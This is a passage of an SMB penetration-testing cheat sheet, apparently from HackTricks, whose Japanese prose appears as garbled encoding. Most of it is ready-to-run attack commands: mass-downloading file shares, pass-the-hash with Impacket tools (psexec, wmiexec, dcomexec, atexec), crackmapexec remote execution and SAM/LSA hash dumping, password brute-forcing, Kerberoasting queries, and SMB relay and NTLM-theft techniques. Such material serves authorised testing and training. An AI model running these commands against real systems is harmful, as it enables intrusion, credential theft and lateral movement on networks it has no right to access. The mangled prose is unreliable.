MMCã‚¹ãƒŠãƒƒãƒ—ã‚¤ãƒ³ï¼ˆã‚°ãƒ©ãƒ•ã‚£ã‚«ãƒ«ï¼‰
```shell
# Shared Folders: Shared Folders > Shares
fsmgmt.msc
# Computer Management: Computer Management > System Tools > Shared Folders > Shares
compmgmt.msc
```
explorer.exeï¼ˆã‚°ãƒ©ãƒ•ã‚£ã‚«ãƒ«ï¼‰ã€`\\<ip>\` ã‚’å…¥åŠ›ã—ã¦ã€åˆ©ç”¨å¯èƒ½ãªééš ã—å…±æœ‰ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

### å…±æœ‰ãƒ•ã‚©ãƒ«ãƒ€ã‚’ãƒã‚¦ãƒ³ãƒˆã™ã‚‹
```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```
### **ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**

è³‡æ ¼æƒ…å ±/Pass-the-Hashã§æ¥ç¶šã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã¯ã€å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’èª­ã‚“ã§ãã ã•ã„ã€‚
```bash
#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
```

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```
ã‚³ãƒãƒ³ãƒ‰:

* mask: ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå†…ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒã‚¹ã‚¯ã‚’æŒ‡å®šã—ã¾ã™ï¼ˆä¾‹: "" ã¯ã™ã¹ã¦ã®ãƒ•ã‚¡ã‚¤ãƒ«ï¼‰
* recurse: å†å¸°ã‚’ã‚ªãƒ³ã«åˆ‡ã‚Šæ›¿ãˆã¾ã™ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆ: ã‚ªãƒ•ï¼‰
* prompt: ãƒ•ã‚¡ã‚¤ãƒ«åã®ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆã‚’ã‚ªãƒ•ã«åˆ‡ã‚Šæ›¿ãˆã¾ã™ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆ: ã‚ªãƒ³ï¼‰
* mget: ãƒã‚¹ã‚¯ã«ä¸€è‡´ã™ã‚‹ã™ã¹ã¦ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ›ã‚¹ãƒˆã‹ã‚‰ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãƒã‚·ãƒ³ã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™

(_smbclientã®manãƒšãƒ¼ã‚¸ã‹ã‚‰ã®æƒ…å ±_)

### ãƒ‰ãƒ¡ã‚¤ãƒ³å…±æœ‰ãƒ•ã‚©ãƒ«ãƒ€ã®æ¤œç´¢

* [**Snaffler**](https://github.com/SnaffCon/Snaffler)****
```bash
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```
* [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) ã‚¹ãƒ‘ã‚¤ãƒ€ãƒ¼ã€‚
* `-M spider_plus [--share <share_name>]`
* `--pattern txt`
```bash
sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
```
ç‰¹ã«èˆˆå‘³æ·±ã„ã®ã¯ã€**`Registry.xml`** ã¨å‘¼ã°ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã§ã€ã‚°ãƒ«ãƒ¼ãƒ—ãƒãƒªã‚·ãƒ¼ã‚’ä»‹ã—ã¦ **autologon** ã§è¨­å®šã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ãŒå«ã¾ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã¾ãŸã¯ã€**`web.config`** ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯è³‡æ ¼æƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

{% hint style="info" %}
**SYSVOL ã‚·ã‚§ã‚¢**ã¯ã€ãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã®ã™ã¹ã¦ã®èªè¨¼ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**èª­ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚ãã“ã§ã¯ã€ã•ã¾ã–ã¾ãªãƒãƒƒãƒã€VBScriptã€PowerShell **ã‚¹ã‚¯ãƒªãƒ—ãƒˆ**ã‚’**è¦‹ã¤ã‘ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚\
ãã‚Œã«å«ã¾ã‚Œã‚‹**ã‚¹ã‚¯ãƒªãƒ—ãƒˆ**ã‚’**ãƒã‚§ãƒƒã‚¯**ã™ã‚‹ã¹ãã§ã™ã€‚ãªãœãªã‚‰ã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ãªã©ã®æ©Ÿå¯†æƒ…å ±ã‚’**è¦‹ã¤ã‘ã‚‹**å¯èƒ½æ€§ãŒã‚ã‚‹ã‹ã‚‰ã§ã™ã€‚
{% endhint %}

## ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã®èª­ã¿å–ã‚Š

ç™ºè¦‹ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦ã€**ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚’èª­ã‚€**ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚Impacket ã® **`reg.py`** ã‚’ä½¿ã£ã¦è©¦ã™ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```
## ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ

**Samba**ã‚µãƒ¼ãƒãƒ¼ã®**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆè¨­å®š**ã¯é€šå¸¸`/etc/samba/smb.conf`ã«ã‚ã‚Šã€ã„ãã¤ã‹ã®**å±é™ºãªè¨­å®š**ãŒå«ã¾ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š

| **è¨­å®š**                     | **èª¬æ˜**                                                           |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | ç¾åœ¨ã®å…±æœ‰å†…ã§åˆ©ç”¨å¯èƒ½ãªå…±æœ‰ã‚’ãƒªã‚¹ãƒˆè¡¨ç¤ºã§ãã¾ã™ã‹ï¼Ÿ                |
| `read only = no`            | ãƒ•ã‚¡ã‚¤ãƒ«ã®ä½œæˆã‚„å¤‰æ›´ã‚’ç¦æ­¢ã—ã¾ã™ã‹ï¼Ÿ                                |
| `writable = yes`            | ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã‚„å¤‰æ›´ã§ãã¾ã™ã‹ï¼Ÿ                           |
| `guest ok = yes`            | ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã›ãšã«ã‚µãƒ¼ãƒ“ã‚¹ã«æ¥ç¶šã§ãã¾ã™ã‹ï¼Ÿ                     |
| `enable privileges = yes`   | ç‰¹å®šã®SIDã«å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸæ¨©é™ã‚’å°Šé‡ã—ã¾ã™ã‹ï¼Ÿ                        |
| `create mask = 0777`        | æ–°ã—ãä½œæˆã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ã«å‰²ã‚Šå½“ã¦ã‚‹ã¹ãæ¨©é™ã¯ä½•ã§ã™ã‹ï¼Ÿ             |
| `directory mask = 0777`     | æ–°ã—ãä½œæˆã•ã‚ŒãŸãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«å‰²ã‚Šå½“ã¦ã‚‹ã¹ãæ¨©é™ã¯ä½•ã§ã™ã‹ï¼Ÿ         |
| `logon script = script.sh`  | ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ­ã‚°ã‚¤ãƒ³æ™‚ã«å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ä½•ã§ã™ã‹ï¼Ÿ       |
| `magic script = script.sh`  | ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒé–‰ã˜ã‚‰ã‚ŒãŸã¨ãã«å®Ÿè¡Œã™ã‚‹ã¹ãã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ä½•ã§ã™ã‹ï¼Ÿ       |
| `magic output = script.out` | magicã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å‡ºåŠ›ã‚’ä¿å­˜ã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´æ‰€ã¯ã©ã“ã§ã™ã‹ï¼Ÿ           |

ã‚³ãƒãƒ³ãƒ‰`smbstatus`ã¯ã€**ã‚µãƒ¼ãƒãƒ¼**ã«é–¢ã™ã‚‹æƒ…å ±ã¨**æ¥ç¶šã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã«é–¢ã™ã‚‹æƒ…å ±ã‚’æä¾›ã—ã¾ã™ã€‚

## Kerberosã‚’ä½¿ç”¨ã—ãŸèªè¨¼

ãƒ„ãƒ¼ãƒ«**smbclient**ã¨**rpcclient**ã‚’ä½¿ç”¨ã—ã¦**kerberos**ã«**èªè¨¼**ã§ãã¾ã™ï¼š
```bash
smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
```
## **ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œ**

### **crackmapexec**

crackmapexecã¯ã€**mmcexec, smbexec, atexec, wmiexec** ã®ã„ãšã‚Œã‹ã‚’**æ‚ªç”¨**ã—ã¦ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚**wmiexec**ãŒ**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆ**ã®æ–¹æ³•ã§ã™ã€‚å¥½ã¿ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ `--exec-method` ã§æŒ‡å®šã§ãã¾ã™ï¼š
```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```
### [**psexec**](../windows-hardening/ntlm/psexec-and-winexec.md)**/**[**smbexec**](../windows-hardening/ntlm/smbexec.md)

ä¸¡æ–¹ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ã€è¢«å®³è€…ã®ãƒã‚·ãƒ³ã«æ–°ã—ã„ã‚µãƒ¼ãƒ“ã‚¹ã‚’**ä½œæˆã—ã¾ã™**ï¼ˆSMBçµŒç”±ã§_\pipe\svcctl_ã‚’ä½¿ç”¨ï¼‰ã—ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦**ä½•ã‹ã‚’å®Ÿè¡Œã—ã¾ã™**ï¼ˆ**psexec**ã¯å®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ADMIN$å…±æœ‰ã«**ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã—ã€**smbexec**ã¯**cmd.exe/powershell.exe**ã‚’æŒ‡ã—ã€å¼•æ•°ã«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å…¥ã‚Œã¾ã™ --**ãƒ•ã‚¡ã‚¤ãƒ«ãƒ¬ã‚¹æŠ€è¡“**--ï¼‰ã€‚\
**è©³ç´°æƒ…å ±**ã¯[**psexec**](../windows-hardening/ntlm/psexec-and-winexec.md)ã¨[**smbexec**](../windows-hardening/ntlm/smbexec.md)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚\
**kali**ã§ã¯ã€/usr/share/doc/python3-impacket/examples/ã«ä½ç½®ã—ã¦ã„ã¾ã™ã€‚
```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
```
**ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**`-k` ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**NTLM** ã®ä»£ã‚ã‚Šã« **kerberos** ã«å¯¾ã—ã¦èªè¨¼ã§ãã¾ã™ã€‚

### [wmiexec](../windows-hardening/ntlm/wmicexec.md)/dcomexec

**ãƒãƒ¼ãƒˆ 135** ã‚’ä»‹ã—ã¦ DCOM ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ‡ã‚£ã‚¹ã‚¯ã«è§¦ã‚ŒãŸã‚Šæ–°ã—ã„ã‚µãƒ¼ãƒ“ã‚¹ã‚’å®Ÿè¡Œã—ãŸã‚Šã›ãšã«ã€ã“ã£ãã‚Šã¨ã‚³ãƒãƒ³ãƒ‰ã‚·ã‚§ãƒ«ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚\
**kali** ã§ã¯ /usr/share/doc/python3-impacket/examples/ ã«ã‚ã‚Šã¾ã™ã€‚
```bash
#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
**ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**`-k` ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**NTLM** ã®ä»£ã‚ã‚Šã« **kerberos** ã«å¯¾ã—ã¦èªè¨¼ã§ãã¾ã™ã€‚
```bash
#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
### [AtExec](../windows-hardening/ntlm/atexec.md)

ã‚¿ã‚¹ã‚¯ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ©ã‚’ä»‹ã—ã¦ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ï¼ˆSMBçµŒç”±ã§ _\pipe\atsvc_ ã‚’ä½¿ç”¨ï¼‰ã€‚\
**kali** ã§ã¯ /usr/share/doc/python3-impacket/examples/ ã«ã‚ã‚Šã¾ã™ã€‚
```bash
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```
## Impacket å‚ç…§

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

## **ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®è³‡æ ¼æƒ…å ±ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹**

**ã“ã‚Œã¯æ¨å¥¨ã•ã‚Œã¾ã›ã‚“ã€‚è¨±å¯ã•ã‚ŒãŸè©¦è¡Œå›æ•°ã‚’è¶…ãˆã‚‹ã¨ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒãƒ­ãƒƒã‚¯ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**
```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
```
## SMB ãƒªãƒ¬ãƒ¼æ”»æ’ƒ

ã“ã®æ”»æ’ƒã¯ã€Responder ãƒ„ãƒ¼ãƒ«ã‚­ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã€å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§ **SMB èªè¨¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£**ã—ã€ãã‚Œã‚’ **ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒã‚·ãƒ³** ã« **ãƒªãƒ¬ãƒ¼** ã—ã¾ã™ã€‚èªè¨¼ **ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒæˆåŠŸã™ã‚‹** ã¨ã€è‡ªå‹•çš„ã« **ã‚·ã‚¹ãƒ†ãƒ ** **ã‚·ã‚§ãƒ«** ã«å…¥ã‚Šã¾ã™ã€‚\
[**ã“ã®æ”»æ’ƒã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã¯ã“ã¡ã‚‰ã€‚**](../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

Windows ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã® URLMon.dll ã¯ã€ãƒšãƒ¼ã‚¸ãŒ SMB çµŒç”±ã§ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã‚ˆã†ã¨ã™ã‚‹ã¨è‡ªå‹•çš„ã«ãƒ›ã‚¹ãƒˆã«å¯¾ã—ã¦èªè¨¼ã‚’è©¦ã¿ã¾ã™ã€‚ä¾‹ãˆã°: `img src="\\10.10.10.10\path\image.jpg"`

ã“ã‚Œã¯ä»¥ä¸‹ã®é–¢æ•°ã§ç™ºç”Ÿã—ã¾ã™:

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

ã“ã‚Œã‚‰ã¯ä¸€éƒ¨ã®ãƒ–ãƒ©ã‚¦ã‚¶ã‚„ãƒ„ãƒ¼ãƒ«ï¼ˆSkype ãªã©ï¼‰ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚

![å‡ºå…¸: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (93).png>)

### MitMf ã‚’ä½¿ç”¨ã—ãŸ SMBTrap

![å‡ºå…¸: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (94).png>)

## NTLM ç›—é›£

SMBTrap ã¨ä¼¼ã¦ã„ã¾ã™ãŒã€æ‚ªæ„ã®ã‚ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚·ã‚¹ãƒ†ãƒ ã«æ¤ãˆä»˜ã‘ã‚‹ï¼ˆä¾‹ãˆã° SMB çµŒç”±ã§ï¼‰ã¨ã€SMB èªè¨¼è©¦è¡Œã‚’èª˜ç™ºã—ã€Responder ã®ã‚ˆã†ãªãƒ„ãƒ¼ãƒ«ã§ NetNTLMv2 ãƒãƒƒã‚·ãƒ¥ã‚’å‚å—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®å¾Œã€ãƒãƒƒã‚·ãƒ¥ã¯ã‚ªãƒ•ãƒ©ã‚¤ãƒ³ã§ã‚¯ãƒ©ãƒƒã‚¯ã™ã‚‹ã‹ã€[SMB ãƒªãƒ¬ãƒ¼æ”»æ’ƒ](pentesting-smb.md#smb-relay-attack)ã§ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

[å‚ç…§: ntlm\_theft](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm\_theft)

## HackTricks è‡ªå‹•ã‚³ãƒãƒ³ãƒ‰
```
Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMB
Note: |
While Port 139 is known technically as â€˜NBT over IPâ€™, Port 445 is â€˜SMB over IPâ€™. SMB stands for â€˜Server Message Blocksâ€™. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.xyz/pentesting/pentesting-smb

Entry_2:
Name: Enum4Linux
Description: General SMB Scan
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB Scan 1
Description: SMB Vuln Scan With Nmap
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb Scan 2
Description: SMB Vuln Scan With Nmap (Less Specific)
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 consolesless mfs enumeration
Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'

```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ**HackTricksã§ä¼šç¤¾ã®åºƒå‘Šã‚’æ²è¼‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ç‰ˆã®PEASSã‚’å…¥æ‰‹**ã—ãŸã‚Šã€**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¦ãã ã•ã„ã€‚ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* **[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã«**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚**
* **[**hacktricksãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks)ã¨[**hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
